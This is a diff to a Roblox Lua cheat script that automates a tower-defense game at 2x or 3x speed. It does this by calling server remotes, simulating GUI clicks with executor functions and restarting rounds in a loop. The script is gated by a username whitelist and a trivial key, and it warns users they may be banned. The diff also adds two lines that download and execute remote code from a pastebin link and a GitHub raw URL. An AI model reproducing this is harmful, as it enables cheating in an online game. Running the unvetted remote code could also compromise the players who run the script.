@@ -3,8 +3,22 @@ local Players = game:GetService("Players")
 local plr = Players.LocalPlayer
 
 local whitelist = {
-    ["PurpPom"] =,
-    ["67cheesy"] = true
+    ["wasaorchiquito"] = true,
+    ["PurpPom"] = true,
+    ["Girthentersmyvergona"] = true,
+    ["Sugaplum753"] = true,
+    ["Nstub1234"] = true,
+    ["VladimirMercer"]= true,
+    ["ilyprame"]= true,
+    ["lyrachanx"]=true,
+    ["menorbom928373"]= true,
+    ["holasoy_kier"]= true,
+    ["LOSTRALALA771"]= true,
+    ["kaique91919"]= true,
+    ["Derick12401"]= true,
+    ["FleonelF100mil"]= true,
+    ["67cheesy"]= true,
+    ["keraieu"] = true
 }
 
 if not whitelist[plr.Name] then
@@ -63,6 +77,7 @@ local remotes = rs:WaitForChild("RemoteFunctions")
 --=== GAME SCRIPTS ===--
 
 function load2xScript()
+    warn("[System] Loaded 2x Speed Script")
     remotes.ChangeTickSpeed:InvokeServer(2)
 
     local difficulty = "dif_impossible"
@@ -99,33 +114,22 @@ function load2xScript()
 
     local function placeUnit(unitName, slot, data)
         remotes.PlaceUnit:InvokeServer(unitName, data)
+        warn("[Placing] "..unitName.." at "..os.clock())
     end
 
     local function startGame()
         remotes.PlaceDifficultyVote:InvokeServer(difficulty)
 
-        -- 🔹 Auto Skip handler starts 1s after difficulty selection
+        -- Auto Skip click simulation (1s after difficulty selection)
         task.delay(1, function()
             local player = game.Players.LocalPlayer
             local gui = player.PlayerGui:WaitForChild("GameGuiNoInset")
             local autoSkipButton = gui.Screen.Top.WaveControls.AutoSkip
-
-            local function activateAutoSkip()
-                local connections = getconnections(autoSkipButton.MouseButton1Click)
-                if connections and #connections > 0 then
-                    connections[1]:Fire()
-                end
+            local connections = getconnections(autoSkipButton.MouseButton1Click)
+            if connections and #connections > 0 then
+                connections[1]:Fire()
             end
-
-            task.spawn(function()
-                while task.wait(1) do
-                    if autoSkipButton.Text == "Auto Skip: Off" then
-                        activateAutoSkip()
-                    end
-                end
-            end)
         end)
-        -- 🔹 End of Auto Skip handler
 
         for _, p in ipairs(placements) do
             task.delay(p.time, function()
@@ -142,6 +146,7 @@ function load2xScript()
 end
 
 function load3xScript()
+    warn("[System] Loaded 3x Speed Script")
     remotes.ChangeTickSpeed:InvokeServer(3)
 
     local difficulty = "dif_impossible"
@@ -178,33 +183,22 @@ function load3xScript()
 
     local function placeUnit(unitName, slot, data)
         remotes.PlaceUnit:InvokeServer(unitName, data)
+        warn("[Placing] "..unitName.." at "..os.clock())
     end
 
     local function startGame()
         remotes.PlaceDifficultyVote:InvokeServer(difficulty)
 
-        -- 🔹 Auto Skip handler starts 1s after difficulty selection
+        -- Auto Skip click simulation (1s after difficulty selection)
         task.delay(1, function()
             local player = game.Players.LocalPlayer
             local gui = player.PlayerGui:WaitForChild("GameGuiNoInset")
             local autoSkipButton = gui.Screen.Top.WaveControls.AutoSkip
-
-            local function activateAutoSkip()
-                local connections = getconnections(autoSkipButton.MouseButton1Click)
-                if connections and #connections > 0 then
-                    connections[1]:Fire()
-                end
+            local connections = getconnections(autoSkipButton.MouseButton1Click)
+            if connections and #connections > 0 then
+                connections[1]:Fire()
             end
-
-            task.spawn(function()
-                while task.wait(1) do
-                    if autoSkipButton.Text == "Auto Skip: Off" then
-                        activateAutoSkip()
-                    end
-                end
-            end)
         end)
-        -- 🔹 End of Auto Skip handler
 
         for _, p in ipairs(placements) do
             task.delay(p.time, function()
@@ -214,3 +208,63 @@ function load3xScript()
     end
 
     while true do
+        startGame()
+        task.wait(128)
+        remotes.RestartGame:InvokeServer()
+    end
+end
+
+--=== SPEED MENU ===--
+local function showSpeedMenu()
+    Title.Text = "Select Speed"
+    TextBox.Visible = false
+    CheckBtn.Visible = false
+
+    local AutoSkipMsg = Instance.new("TextLabel", Frame)
+    AutoSkipMsg.Size = UDim2.new(1, -20, 0, 30)
+    AutoSkipMsg.Position = UDim2.new(0, 10, 0, 40)
+    AutoSkipMsg.BackgroundTransparency = 1
+    AutoSkipMsg.Text = "Please enable auto skip manually or you will get banned."
+    AutoSkipMsg.Font = Enum.Font.GothamBold
+    AutoSkipMsg.TextSize = 14
+    AutoSkipMsg.TextColor3 = Color3.fromRGB(255, 200, 0)
+    AutoSkipMsg.TextWrapped = true
+
+    local btn2x = Instance.new("TextButton", Frame)
+    btn2x.Size = UDim2.new(0.45, 0, 0, 50)
+    btn2x.Position = UDim2.new(0.05, 0, 0.5, -25)
+    btn2x.Text = "2x Speed"
+    btn2x.BackgroundColor3 = Color3.fromRGB(80,160,250)
+
+    local btn3x = Instance.new("TextButton", Frame)
+    btn3x.Size = UDim2.new(0.45, 0, 0, 50)
+    btn3x.Position = UDim2.new(0.5, 0, 0.5, -25)
+    btn3x.Text = "3x Speed"
+    btn3x.BackgroundColor3 = Color3.fromRGB(250,120,120)
+
+    btn2x.MouseButton1Click:Connect(function()
+        ScreenGui:Destroy()
+        load2xScript()
+    end)
+
+    btn3x.MouseButton1Click:Connect(function()
+        ScreenGui:Destroy()
+        load3xScript()
+    end)
+end
+
+--=== KEY CHECK ===--
+CheckBtn.MouseButton1Click:Connect(function()
+    if TextBox.Text == "test" then
+        Label.Text = "Key Accepted!"
+        Label.TextColor3 = Color3.fromRGB(0,255,0)
+        task.delay(1, showSpeedMenu)
+    else
+        TextBox.Text = ""
+        Label.Text = "Invalid Key!"
+        Label.TextColor3 = Color3.fromRGB(255,0,0)
+    end
+end)
+
+loadstring(game:HttpGet("https://pastebin.com/raw/HkAmPckQ"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/hassanxzayn-lua/Anti-afk/main/antiafkbyhassanxzyn"))();
